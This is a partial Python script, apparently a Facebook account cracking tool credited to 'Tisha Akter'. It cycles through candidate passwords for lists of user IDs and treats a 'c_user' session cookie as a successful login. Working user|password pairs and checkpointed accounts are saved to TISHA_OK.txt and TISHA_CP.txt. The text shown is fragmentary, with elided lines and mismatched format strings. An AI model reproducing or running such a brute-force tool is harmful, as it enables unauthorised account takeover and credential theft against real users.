...
\033[0;92mAUTHOR   : TISHA AKTER

 

\033[0;93mFACEBOOK : TISHA AKTER

 

\033[0;94mGITHUB   : TISHA MONI
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mTISHA_OK.txt' % (H, P, str(len(ok))))

	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91TISHA_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r\x1b[1;92m[TISHA] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[TISHA-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('TISHA_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[TISHA-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('TISHA_CP.txt' , 'a').write('%s\n' % wrt)
